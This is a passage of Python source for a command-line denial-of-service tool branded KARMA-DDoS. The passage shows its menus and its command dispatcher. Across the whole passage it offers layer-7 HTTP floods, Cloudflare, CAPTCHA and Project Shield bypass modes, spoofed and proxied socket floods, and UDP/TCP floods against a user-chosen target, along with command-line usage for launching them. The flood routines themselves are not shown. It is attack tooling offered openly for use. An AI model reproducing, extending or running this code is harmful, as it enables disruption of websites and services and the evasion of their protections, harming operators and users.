    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "YOU♥     " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Plz star project :)                    " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "github   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " github.com/HyukIsBack/KARMA-DDoS       " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def credit():
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╗\n")
    stdout.write("\x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "Developer " + Fore.RED + ": \x1b[38;2;0;255;189mHyuk\n")
    stdout.write("\x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "UI Design " + Fore.RED + ": \x1b[38;2;0;255;189mYone不\n")
    stdout.write("\x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "Methods/Tools " + Fore.RED + ": \x1b[38;2;0;255;189mSkyWtkh\n")
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def layer7():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 " + Fore.LIGHTWHITE_EX + "╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩              \n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "        ══╦═════════════════════════════════╦══\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "╔══════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "cfb    " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Bypass CF Attack                         " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pxcfb  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Bypass CF Attack With Proxy              " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "cfreq  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Bypass CF UAM, CAPTCHA, BFM (request)    " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "cfsoc  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Bypass CF UAM, CAPTCHA, BFM (socket)     " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pxsky  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Bypass Google Project Shield, Vshield,   " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m  " + Fore.LIGHTWHITE_EX + "       " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " DDoS Guard Free, CF NoSec With Proxy     " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "sky    " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Sky method without proxy                 " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "http2  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " HTTP 2.0 Request Attack                  " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pxhttp2" + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " HTTP 2.0 Request Attack With Proxy       " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "get    " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Get Request Attack                       " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "post   " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Post Request Attack                      " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "head   " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Head Request Attack                      " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pps    " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Only GET / HTTP/1.1                      " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "spoof  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " HTTP Spoof Socket Attack                 " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pxspoof" + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " HTTP Spoof Socket Attack With Proxy      " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "soc    " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Socket Attack                            " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pxraw  " + Fore.LIGHTWHITE_EX + "" + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Proxy Request Attack                     " + Fore.LIGHTWHITE_EX + "" + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pxsoc  " + Fore.LIGHTWHITE_EX + "" + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Proxy Socket Attack                      " + Fore.LIGHTWHITE_EX + "" + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "╚══════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def layer4():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 " + Fore.LIGHTWHITE_EX + "╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              \n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "        ══╦═════════════════════════════════╦══\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "udp   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " UDP Attack                                " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "tcp   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " TCP Attack                                " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def tools():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 " + Fore.LIGHTWHITE_EX + "╔╦╗╔═╗╔═╗╦  ╔═╗             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + " ║ ║ ║║ ║║  ╚═╗             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + " ╩ ╚═╝╚═╝╩═╝╚═╝             \n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "        ══╦═════════════════════════════════╦══\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "geoip " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Geo IP Address Lookup" + Fore.LIGHTCYAN_EX + "                     ║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "dns   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Classic DNS Lookup   " + Fore.LIGHTCYAN_EX + "                     ║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "subnet" + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Subnet IP Address Lookup   " + Fore.LIGHTCYAN_EX + "               ║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def title():
    stdout.write("                                                                                          \n")
    stdout.write("                                 " + Fore.LIGHTWHITE_EX + "╦╔═╔═╗╦═╗╔╦╗╔═╗                 \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "╠╩╗╠═╣╠╦╝║║║╠═╣                 \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "╩ ╩╩ ╩╩╚═╩ ╩╩ ╩                \n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "        ══╦═════════════════════════════════╦══\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ " + Fore.LIGHTWHITE_EX + "        Welcome To The Main Screen Of Karma  " + Fore.LIGHTCYAN_EX + "       ║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ " + Fore.LIGHTWHITE_EX + "          Type [help] to see the Commands    " + Fore.LIGHTCYAN_EX + "       ║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ " + Fore.LIGHTWHITE_EX + "         Contact Dev - Telegram @zjfoq394   " + Fore.LIGHTCYAN_EX + "        ║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def command():
    stdout.write(Fore.LIGHTCYAN_EX + "╔═══" + Fore.LIGHTCYAN_EX + "[""root" + Fore.LIGHTGREEN_EX + "@" + Fore.LIGHTCYAN_EX + "Karma" + Fore.CYAN + "]" + Fore.LIGHTCYAN_EX + "\n╚══\x1b[38;2;0;255;189m> " + Fore.WHITE)
    command = input()
    if command == "cls" or command == "clear":
        clear()
        title()
    elif command == "help" or command == "?":
        help()
    elif command == "credit":
        credit()
    elif command in ("layer7", "LAYER7", "l7", "L7", "Layer7"):
        layer7()
    elif command in ("layer4", "LAYER4", "l4", "L4", "Layer4"):
        layer4()
    elif command in ("tools", "tool"):
        tools()
    elif command == "exit":
        sys.exit()
    elif command == "test":
        target, thread, t = get_info_l7()
        test1(target, thread, t)
        time.sleep(10)
    elif command in ("http2", "HTTP2"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif command in ("pxhttp2", "PXHTTP2"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    elif command in ("cfb", "CFB"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif command in ("pxcfb", "PXCFB"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif command in ("pps", "PPS"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPPS(target, thread, t)
        timer.join()
    elif command in ("spoof", "SPOOF"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSPOOF(target, thread, t)
        timer.join()
    elif command in ("pxspoof", "PXSPOOF"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSPOOF(target, thread, t, proxies)
            timer.join()
    elif command in ("get", "GET"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif command in ("post", "POST"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif command in ("head", "HEAD"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif command in ("pxraw", "PXRAW"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif command in ("soc", "SOC"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif command in ("pxsoc", "PXSOC"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif command in ("cfreq", "CFREQ"):
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Failed to bypass cf\n")
    elif command in ("cfsoc", "CFSOC"):
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Failed to bypass cf\n")
    elif command in ("pxsky", "PXSKY"):
        if get_proxies():
            target, thread, t = get_info_l7()
            th = threading.Thread(target=attackSKY, args=(target, t, thread))
            th.daemon = True
            th.start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif command in ("sky", "SKY"):
        target, thread, t = get_info_l7()
        th = threading.Thread(target=attackSTELLAR, args=(target, t, thread))
        th.daemon = True
        th.start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command in ("udp", "UDP"):
        target, port, thread, t = get_info_l4()
        th = threading.Thread(target=runsender, args=(target, port, t, thread))
        th.daemon = True
        th.start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command in ("tcp", "TCP"):
        target, port, thread, t = get_info_l4()
        th = threading.Thread(target=runflooder, args=(target, port, t, thread))
        th.daemon = True
        th.start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "subnet":
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}", timeout=10)
            print(r.text)
        except Exception:
            print('An error has occurred while sending the request to the API!')
    elif command == "dns":
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP/DOMAIN " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}", timeout=10)
            print(r.text)
        except Exception:
            print('An error has occurred while sending the request to the API!')
    elif command == "geoip":
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}", timeout=10)
            print(r.text)
        except Exception:
            print('An error has occurred while sending the request to the API!')
    else:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "Unknown command. type 'help' to see all commands.\n")
##############################################################################################


if __name__ == '__main__':
    init(convert=True)

    # Vytvoření resources/ua.txt, pokud chybí
    if not os.path.exists('./resources'):
        os.makedirs('./resources')
    if not os.path.exists('./resources/ua.txt'):
        open('./resources/ua.txt', 'w').write(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\n"
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15\n"
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\n"
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1\n"
        )

    if len(sys.argv) < 2:
        ua = [x for x in open('./resources/ua.txt', 'r').read().split('\n') if x.strip()]
        clear()
        title()
        while True:
            command()
    elif len(sys.argv) == 5:
        ua = [x for x in open('./resources/ua.txt', 'r').read().split('\n') if x.strip()]
        method = sys.argv[1].rstrip()
        target = sys.argv[2].rstrip()
        thread = sys.argv[3].rstrip()
        t = sys.argv[4].rstrip()

        if method == "cfb":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchCFB(target, thread, t); timer.join()
        elif method == "pxcfb":
            if get_proxies():
                timer = threading.Thread(target=countdown, args=(t,)); timer.start()
                LaunchPXCFB(target, thread, t); timer.join()
        elif method == "get":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchRAW(target, thread, t); timer.join()
        elif method == "post":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchPOST(target, thread, t); timer.join()
        elif method == "head":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchHEAD(target, thread, t); timer.join()
        elif method == "pxraw":
            if get_proxies():
                timer = threading.Thread(target=countdown, args=(t,)); timer.start()
                LaunchPXRAW(target, thread, t); timer.join()
        elif method == "soc":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchSOC(target, thread, t); timer.join()
        elif method == "pxsoc":
            if get_proxies():
                timer = threading.Thread(target=countdown, args=(t,)); timer.start()
                LaunchPXSOC(target, thread, t); timer.join()
        elif method == "pxspoof":
            if get_proxies():
                timer = threading.Thread(target=countdown, args=(t,)); timer.start()
                LaunchPXSPOOF(target, thread, t, proxies); timer.join()
        elif method == "cfreq":
            stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 60s)\n")
            if get_cookie(target):
                timer = threading.Thread(target=countdown, args=(t,)); timer.start()
                LaunchCFPRO(target, thread, t); timer.join()
            else:
                stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Failed to bypass cf\n")
        elif method == "cfsoc":
            stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 60s)\n")
            if get_cookie(target):
                timer = threading.Thread(target=countdown, args=(t,)); timer.start()
                LaunchCFSOC(target, thread, t); timer.join()
            else:
                stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Failed to bypass cf\n")
        elif method == "http2":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchHTTP2(target, thread, t); timer.join()
        elif method == "pxhttp2":
            if get_proxies():
                timer = threading.Thread(target=countdown, args=(t,)); timer.start()
                LaunchPXHTTP2(target, thread, t); timer.join()
        elif method == "pxsky":
            if get_proxies():
                th = threading.Thread(target=attackSKY, args=(target, t, thread)); th.daemon = True; th.start()
                timer = threading.Thread(target=countdown, args=(t,)); timer.start(); timer.join()
        elif method == "sky":
            th = threading.Thread(target=attackSTELLAR, args=(target, t, thread)); th.daemon = True; th.start()
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); timer.join()
        else:
            stdout.write("No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc, pxspoof\n")
    else:
        stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc, pxspoof\n")
        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
        sys.exit()